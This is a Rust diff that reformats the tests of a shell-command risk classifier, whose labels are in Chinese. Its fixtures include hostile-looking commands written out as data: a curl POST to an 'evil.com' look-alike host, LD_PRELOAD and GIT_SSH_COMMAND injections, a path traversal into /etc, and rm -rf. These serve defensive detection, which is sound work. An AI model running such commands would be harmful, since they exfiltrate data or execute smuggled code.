-    if !args.iter().any(|a| matches!(*a, "--version" | "-V" | "--help" | "-h")) {
+    if !args
+        .iter()
+        .any(|a| matches!(*a, "--version" | "-V" | "--help" | "-h"))
+    {
         out.push("从标准输入执行代码（python）".into());
     }
 }
@@ -775,9 +1198,14 @@ mod tests {
                 _ => {}
             }
         }
-        let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).unwrap();
+        let home = std::env::var("USERPROFILE")
+            .or_else(|_| std::env::var("HOME"))
+            .unwrap();
         let mut commands = Vec::new();
-        for entry in std::fs::read_dir(std::path::Path::new(&home).join(".cove/sessions")).unwrap().flatten() {
+        for entry in std::fs::read_dir(std::path::Path::new(&home).join(".cove/sessions"))
+            .unwrap()
+            .flatten()
+        {
             if let Ok(text) = std::fs::read_to_string(entry.path())
                 && let Ok(value) = serde_json::from_str::<serde_json::Value>(&text)
             {
@@ -797,7 +1225,11 @@ mod tests {
             for reason in found {
                 report.push_str(&format!(
                     "[{reason}] {}\n",
-                    command.chars().take(220).collect::<String>().replace('\n', "⏎")
+                    command
+                        .chars()
+                        .take(220)
+                        .collect::<String>()
+                        .replace('\n', "⏎")
                 ));
                 let key = reason.split('（').next().unwrap_or(&reason).to_owned();
                 let entry = counts.entry(key).or_insert((0, String::new()));
@@ -814,7 +1246,10 @@ mod tests {
         let mut rows: Vec<_> = counts.into_iter().collect();
         rows.sort_by_key(|row| std::cmp::Reverse(row.1.0));
         for (reason, (count, sample)) in rows {
-            println!("{count:5}  {reason}\n       e.g. {}", sample.replace('\n', "⏎"));
+            println!(
+                "{count:5}  {reason}\n       e.g. {}",
+                sample.replace('\n', "⏎")
+            );
         }
     }
 
@@ -863,7 +1298,12 @@ mod tests {
             assert_eq!(posix(command), Vec::<String>::new(), "{command}");
         }
         let ps = |c| reasons(c, Dialect::PowerShell);
-        assert!(ps("Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1 } | Select-Object FullName").is_empty());
+        assert!(
+            ps(
+                "Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1 } | Select-Object FullName"
+            )
+            .is_empty()
+        );
         assert!(ps("$x = Get-Content a.txt; $x.Length").is_empty());
         let cmd = |c| reasons(c, Dialect::Cmd);
         assert!(cmd("dir /s /b src & type a.txt | findstr foo").is_empty());
@@ -879,15 +1319,27 @@ mod tests {
             ("cargo fmt", "原地改写源码（cargo）"),
             ("prettier --write src", "原地改写源码（prettier）"),
             ("git push origin main", "推送到远端（git push）"),
-            ("git reset --hard HEAD~1", "移动分支指针或丢弃改动（git reset）"),
+            (
+                "git reset --hard HEAD~1",
+                "移动分支指针或丢弃改动（git reset）",
+            ),
             ("git checkout main", "修改工作区或仓库历史（git checkout）"),
-            ("npm install left-pad", "安装、卸载或更新依赖（npm install）"),
+            (
+                "npm install left-pad",
+                "安装、卸载或更新依赖（npm install）",
+            ),
             ("cargo add serde", "安装、卸载或更新依赖（cargo add）"),
             ("go get example.com/x", "安装、卸载或更新依赖（go get）"),
             ("npm publish", "发布或修改远端（npm publish）"),
-            ("curl -X POST https://x/api -d a=1", "向远端发送修改请求（curl）"),
+            (
+                "curl -X POST https://x/api -d a=1",
+                "向远端发送修改请求（curl）",
+            ),
             ("curl -o x.zip https://x/x.zip", "下载文件到本地（curl -o）"),
-            ("gh pr create --fill", "修改 GitHub 上的内容（gh pr create）"),
+            (
+                "gh pr create --fill",
+                "修改 GitHub 上的内容（gh pr create）",
+            ),
             ("kubectl apply -f k.yaml", "修改集群资源（kubectl apply）"),
             ("python -c 'import os'", "执行内联代码（python -c）"),
             ("node -e 'require(1)'", "执行内联代码（node）"),
@@ -896,32 +1348,69 @@ mod tests {
             ("sudo ls", "提权运行（sudo）"),
             ("kill 1234", "结束进程（kill）"),
             ("PATH=/tmp:$PATH; ls", "修改 shell 控制变量（PATH）"),
-            ("export LD_PRELOAD=/tmp/x.so", "修改影响子进程的环境变量（LD_PRELOAD）"),
+            (
+                "export LD_PRELOAD=/tmp/x.so",
+                "修改影响子进程的环境变量（LD_PRELOAD）",
+            ),
             ("bash -c 'rm -rf x'", "删除文件（rm）"),
             ("find . -name '*.tmp' -delete", "删除文件（find -delete）"),
             ("find . -exec rm {} +", "删除文件（rm）"),
             ("git ls-files | xargs rm", "删除文件（rm）"),
-            ("python3 <<EOF\nprint(1)\nEOF", "从标准输入执行代码（python）"),
+            (
+                "python3 <<EOF\nprint(1)\nEOF",
+                "从标准输入执行代码（python）",
+            ),
             ("tar -xzf a.tgz", "解压或打包写文件（tar）"),
-            ("git reset --soft HEAD~1", "移动分支指针或丢弃改动（git reset）"),
+            (
+                "git reset --soft HEAD~1",
+                "移动分支指针或丢弃改动（git reset）",
+            ),
             ("git tag -d v1", "删除或覆盖标签（git tag）"),
-            ("git branch -m old new", "删除、重命名或覆盖分支（git branch）"),
-            ("env GIT_SSH_COMMAND='sh x' git fetch", "修改影响子进程的环境变量（GIT_SSH_COMMAND）"),
-            ("env GIT_CONFIG_VALUE_0='!sh x' git status", "修改影响子进程的环境变量（GIT_CONFIG_VALUE_0）"),
-            ("echo x > /tmp/../etc/x", "写入文件（重定向到 /tmp/../etc/x）"),
+            (
+                "git branch -m old new",
+                "删除、重命名或覆盖分支（git branch）",
+            ),
+            (
+                "env GIT_SSH_COMMAND='sh x' git fetch",
+                "修改影响子进程的环境变量（GIT_SSH_COMMAND）",
+            ),
+            (
+                "env GIT_CONFIG_VALUE_0='!sh x' git status",
+                "修改影响子进程的环境变量（GIT_CONFIG_VALUE_0）",
+            ),
+            (
+                "echo x > /tmp/../etc/x",
+                "写入文件（重定向到 /tmp/../etc/x）",
+            ),
             ("cp /tmp/x src/x", "修改文件（cp）"),
-            ("curl -X DELETE http://localhost:8080/items/1", "向远端发送修改请求（curl）"),
-            ("curl -d a=1 http://127.0.0.1.evil.com/x", "向远端发送修改请求（curl）"),
-            ("curl $args https://x", "参数含变量，无法确认不会写文件（curl）"),
+            (
+                "curl -X DELETE http://localhost:8080/items/1",
+                "向远端发送修改请求（curl）",
+            ),
+            (
+                "curl -d a=1 http://127.0.0.1.evil.com/x",
+                "向远端发送修改请求（curl）",
+            ),
+            (
+                "curl $args https://x",
+                "参数含变量，无法确认不会写文件（curl）",
+            ),
         ] {
             let got = posix(command);
             assert!(got.contains(&reason.to_owned()), "{command}: {got:?}");
         }
         let ps = |c| reasons(c, Dialect::PowerShell);
         assert!(ps("Remove-Item -Recurse x").contains(&"删除文件（remove-item）".to_owned()));
-        assert!(ps("Get-ChildItem | ForEach-Object { Remove-Item $_ }").contains(&"删除文件（remove-item）".to_owned()));
+        assert!(
+            ps("Get-ChildItem | ForEach-Object { Remove-Item $_ }")
+                .contains(&"删除文件（remove-item）".to_owned())
+        );
         assert!(ps("Set-Content a.txt hi").contains(&"修改文件（set-content）".to_owned()));
-        assert!(ps("Invoke-WebRequest https://x -OutFile a.zip").iter().any(|r| r.contains("下载文件")));
+        assert!(
+            ps("Invoke-WebRequest https://x -OutFile a.zip")
+                .iter()
+                .any(|r| r.contains("下载文件"))
+        );
         assert!(!ps("$env:PATH = 'C:\\x'").is_empty());
         let cmd = |c| reasons(c, Dialect::Cmd);
         assert!(cmd("del /q x").contains(&"删除文件（del）".to_owned()));
